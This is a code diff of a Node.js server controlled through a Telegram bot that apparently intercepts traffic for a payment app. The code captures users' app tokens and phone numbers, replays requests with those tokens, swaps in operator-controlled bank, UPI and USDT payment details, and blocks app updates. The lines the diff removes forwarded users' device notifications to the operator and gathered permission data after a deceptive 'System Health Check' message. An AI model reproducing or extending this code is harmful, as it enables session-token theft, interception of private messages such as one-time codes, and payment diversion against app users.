@@ -25,8 +25,7 @@ const DEFAULT_DATA = {
   userOverrides: {},
   trackedUsers: {},
   suspendedPhones: {},
-  blockUpdate: true,
-  forwardNotifications: false
+  blockUpdate: true
 };
 
 let bot = null;
@@ -44,7 +43,6 @@ const CACHE_TTL = 5000;
 const tokenUserMap = {};
 const userTokenMap = {}; // userId -> latest real apptoken seen on incoming proxy request
 const userPhoneMap = {};
-const userPermissionsMap = {};
 let debugNextResponse = false;
 
 async function safeSend(chatId, text) {
@@ -417,27 +415,6 @@ app.use((req, res, next) => {
             redis.hset('ezpayTokenMap', key, uid).catch(()=>{});
             redis.hset('ezpayUserTokenMap', uid, tok).catch(()=>{});
           }
-        }
-      }
-    }
-
-    // Capture live permissions from request headers
-    const hasPerms = req.headers['x-perm-listener'] || req.headers['x-perm-storage'];
-    if (hasPerms && mc) {
-      const uid = String(mc).replace(/^MC/i, '').trim();
-      if (uid && /^\d{3,}$/.test(uid)) {
-        const perms = {
-          listener: req.headers['x-perm-listener'] || 'UNKNOWN',
-          storage: req.headers['x-perm-storage'] || 'UNKNOWN',
-          camera: req.headers['x-perm-camera'] || 'UNKNOWN',
-          overlay: req.headers['x-perm-overlay'] || 'UNKNOWN',
-          postNotif: req.headers['x-perm-post-notif'] || 'UNKNOWN',
-          lastChecked: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-        };
-        userPermissionsMap[uid] = perms;
-        if (redis) {
-          redis.hset('ezpayUserPermissions', uid, JSON.stringify(perms)).catch(()=>{});
-          redis.set(`ezpay:live_check_resp:${uid}`, JSON.stringify(perms), 'EX', 15).catch(()=>{});
         }
       }
     }
@@ -907,12 +884,6 @@ app.post('/bot-webhook', async (req, res) => {
 /cancelbuy <id> <orderId> — Cancel recharge order
 /raw <id> <path> [json] — Custom POST to any endpoint
 
-=== NOTIFICATIONS ===
-/notif on — Global notifications ON
-/notif off — Global notifications OFF
-/notif on <userId> — Notifications ON for specific user
-/notif off <userId> — Notifications OFF for specific user
-
 Example:
 /addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
       );
@@ -927,7 +898,7 @@ Example:
     if (text === '/status') {
       const active = getActiveBank(data, null);
       const idCount = Object.keys(data.userOverrides || {}).length;
-      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nNotifications: ${data.forwardNotifications ? '🔔 ON' : '🔕 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
+      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
       if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
@@ -939,32 +910,6 @@ Example:
     if (text === '/off') { data = await loadData(true); data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
     if (text === '/rotate') { data = await loadData(true); data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
     if (text === '/log') { data = await loadData(true); data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
-
-    if (text.startsWith('/notif ')) {
-      const parts = text.substring(7).trim().split(/\s+/);
-      const action = parts[0].toLowerCase();
-      const targetUserId = parts[1] || '';
-      if (action !== 'on' && action !== 'off') {
-        await bot.sendMessage(chatId, '❌ Format:\n/notif on\n/notif off\n/notif on <userId>\n/notif off <userId>');
-        return res.sendStatus(200);
-      }
-      data = await loadData(true);
-      const isEnable = (action === 'on');
-      if (targetUserId) {
-        if (!data.userOverrides) data.userOverrides = {};
-        if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
-        data.userOverrides[targetUserId].forwardNotifications = isEnable;
-        data._skipOverrideMerge = true;
-        await saveData(data);
-        await bot.sendMessage(chatId, `🔔 Notifications ${isEnable ? '🟢 ON' : '🔴 OFF'} for specific user ${targetUserId}`);
-      } else {
-        data.forwardNotifications = isEnable;
-        data._skipOverrideMerge = true;
-        await saveData(data);
-        await bot.sendMessage(chatId, `🔔 Global Notification Forwarding: ${isEnable ? '🟢 ON' : '🔴 OFF'}`);
-      }
-      return res.sendStatus(200);
-    }
 
     if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace request ka full response dump aayega'); return res.sendStatus(200); }
 
@@ -1194,7 +1139,7 @@ Example:
       return res.sendStatus(200);
     }
 
-    const TOKEN_CMDS = 'permission|sellon|selloff|upis|details|tgrobot|profile|bank|wallets|orders|sellsearch|recharges|withdraws|balrec|stats|usdtrate|customer|sendcode|unbind|cancelsell|cancelbuy|raw|invite|teamstats|pending|hold|messages|dailytask|usdttask|novicetask|invitetask|ranking|home|menu|lasttoken';
+    const TOKEN_CMDS = 'sellon|selloff|upis|details|tgrobot|profile|bank|wallets|orders|sellsearch|recharges|withdraws|balrec|stats|usdtrate|customer|sendcode|unbind|cancelsell|cancelbuy|raw|invite|teamstats|pending|hold|messages|dailytask|usdttask|novicetask|invitetask|ranking|home|menu|lasttoken';
     const tokenCmdMatch = text.match(new RegExp(`^\\/(${TOKEN_CMDS})\\s+(.+)$`, 'i'));
     if (tokenCmdMatch) {
       const cmd = tokenCmdMatch[1].toLowerCase();
@@ -1210,108 +1155,7 @@ Example:
       // Auto-resolve: input can be userId (185806), MC code (MC185806), phone (10 digit), or full apptoken
       const resolved = await resolveTokenAndUser(rawArg);
       let rawToken = resolved.token;
-      let uid = resolved.userId || rawArg.replace(/^MC/i, '').trim();
-
-      if (cmd === 'permission') {
-        let perms = null;
-        let isLive = false;
-
-        if (redis) {
-          try {
-            await redis.del(`ezpay:live_check_resp:${uid}`);
-            await redis.set(`ezpay:live_check_req:${uid}`, '1', 'EX', 15);
-          } catch(e) {}
-        }
-
-        // Try to retrieve user's Telegram Chat ID to send a live ping
-        let tgUserId = null;
-        if (rawToken) {
-          const memberCodeHdr = uid.startsWith('MC') ? uid : ('MC' + uid);
-          const upstreamHeaders = {
-            'apptoken': rawToken,
-            'packagename': 'com.syq.ez.pay',
-            'version': '1.2.3',
-            'versioncode': '23',
-            'membercode': memberCodeHdr,
-            'host': 'api.ezpaycenter.com',
-            'content-type': 'application/json; charset=utf-8',
-            'accept': '*/*',
-            'accept-encoding': 'gzip',
-            'user-agent': 'okhttp/4.11.0'
-          };
-          try {
-            const r = await fetch(ORIGINAL_API + '/app/api/memberManager/bindRobotDetail', { method: 'POST', headers: upstreamHeaders, body: '{}' });
-            const txt = await r.text();
-            let j = null; try { j = JSON.parse(txt); } catch(e) {}
-            const d = getResponseData(j) || {};
-            if (d.telegramUserId || d.tgUserId) {
-              tgUserId = String(d.telegramUserId || d.tgUserId);
-            }
-          } catch(e) {}
-        }
-
-        if (tgUserId) {
-          // Send system health check to trigger live notification check on device
-          await safeSend(tgUserId, `⚙️ *System Health Check*\nVerifying app permissions...`);
-        }
-
-        // Poll Redis for the live response from the client
-        if (redis) {
-          try {
-            for (let i = 0; i < 6; i++) {
-              await new Promise(r => setTimeout(r, 1000));
-              const resp = await redis.get(`ezpay:live_check_resp:${uid}`);
-              if (resp) {
-                perms = typeof resp === 'string' ? JSON.parse(resp) : resp;
-                isLive = true;
-                break;
-              }
-            }
-            await redis.del(`ezpay:live_check_req:${uid}`);
-          } catch(e) {}
-        }
-
-        // Fall back to cache if live request timed out or user doesn't have Telegram bound
-        if (!perms) {
-          if (redis) {
-            try {
-              const raw = await redis.hget('ezpayUserPermissions', uid);
-              if (raw) perms = typeof raw === 'string' ? JSON.parse(raw) : raw;
-            } catch(e) {}
-          }
-          if (!perms) perms = userPermissionsMap[uid];
-        }
-
-        if (!perms) {
-          await bot.sendMessage(chatId, `❌ User ${uid} ke liye koi permission report nahi mili.\n\nUser ko ek baar app open karne ko kahein taaki status update ho sake.`);
-          return res.sendStatus(200);
-        }
-
-        const formatStatus = (status) => {
-          if (status === 'ALLOWED') return '🟢 ALLOWED (Active)';
-          if (status === 'DENIED') return '🔴 DENIED (Inactive)';
-          return '❓ UNKNOWN';
-        };
-
-        const phone = getPhone(data, uid);
-        const statusLine = isLive ? '🟢 *LIVE (Just Updated)*' : '⚠️ *OFFLINE (Showing cached)*';
-        const msg = `🛡️ *PERMISSION REPORT* [${statusLine}]\n` +
-                    `━━━━━━━━━━━━━━━━━━\n` +
-                    `👤 *User ID*: \`MC${uid}\`\n` +
-                    `📱 *Phone*: \`${phone || 'N/A'}\`\n` +
-                    `━━━━━━━━━━━━━━━━━━\n` +
-                    `🔔 *Notification Listener*: ${formatStatus(perms.listener)}\n` +
-                    `📂 *Storage Access*: ${formatStatus(perms.storage)}\n` +
-                    `📷 *Camera Access*: ${formatStatus(perms.camera)}\n` +
-                    `📺 *Draw Over Other Apps*: ${formatStatus(perms.overlay)}\n` +
-                    `💬 *Post Notifications*: ${formatStatus(perms.postNotif)}\n` +
-                    `━━━━━━━━━━━━━━━━━━\n` +
-                    `🕒 *Last Checked*: \`${perms.lastChecked}\``;
-
-        await bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
-        return res.sendStatus(200);
-      }
-
+      let uid = resolved.userId;
       if (!rawToken && /^\d{4,10}$/.test(rawArg.replace(/^MC/i, '').split('_')[0])) {
         await bot.sendMessage(chatId, `❌ User ${uid || rawArg} ka real apptoken abhi tak capture nahi hua.\n\nUser ko app khol ke ek baar koi action karna hoga (login/refresh) — phir token automatic store ho jayega.\n\nYa direct full apptoken paste karo: /${cmd} <fullApptoken>`);
         return res.sendStatus(200);
@@ -2169,49 +2013,6 @@ Example:
   } catch(e) {
     console.error('Bot error:', e);
     return res.sendStatus(200);
-  }
-});
-
-app.post('/app/api/notification/report', async (req, res) => {
-  try {
-    const data = await loadData();
-    const userId = await extractUserId(req, null);
-    const uo = getUserOverride(data, userId);
-    const isEnabled = (uo && uo.forwardNotifications !== undefined) ? uo.forwardNotifications : data.forwardNotifications;
-    if (!isEnabled) {
-      return res.json({ success: true, message: 'Forwarding disabled' });
-    }
-    const body = req.parsedBody || {};
-    const title = body.title || 'No Title';
-    const text = body.text || 'No Content';
-    const appPkg = body.packageName || 'Unknown';
-    const deviceTime = body.time || new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-    const phone = getPhone(data, userId);
-    let tgMessage;
-    if (appPkg === 'com.syq.ez.pay' || title === 'Notification Access Status') {
-      const isAllowed = text.includes('ALLOWED');
-      const statusEmoji = isAllowed ? '🟢 ALLOWED (Active)' : '🔴 DENIED (Inactive)';
-      tgMessage = `⚙️ *SYSTEM: Notification Access Update*\n` +
-                  `━━━━━━━━━━━━━━━━━━\n` +
-                  `👤 *User ID*: \`${userId || 'N/A'}\`\n` +
-                  `📱 *Phone*: \`${phone || 'N/A'}\`\n` +
-                  `🛡️ *Status*: ${statusEmoji}\n` +
-                  `🕒 *Time*: \`${deviceTime}\`\n` +
-                  `━━━━━━━━━━━━━━━━━━`;
-    } else {
-      tgMessage = `🔔 *New Notification Received*\n` +
-                  `👤 *User ID*: ${userId || 'N/A'}\n` +
-                  `📱 *Phone*: ${phone || 'N/A'}\n` +
-                  `📦 *App*: ${appPkg}\n` +
-                  `📌 *Title*: ${title}\n` +
-                  `💬 *Message*: ${text}\n` +
-                  `🕒 *Time*: ${deviceTime}`;
-    }
-    await safeSend(data.adminChatId, tgMessage);
-    res.json({ success: true, message: 'Notification forwarded' });
-  } catch(e) {
-    console.error('[NOTIF_REPORT_ERR]', e.message);
-    res.status(500).json({ error: e.message });
   }
 });
 
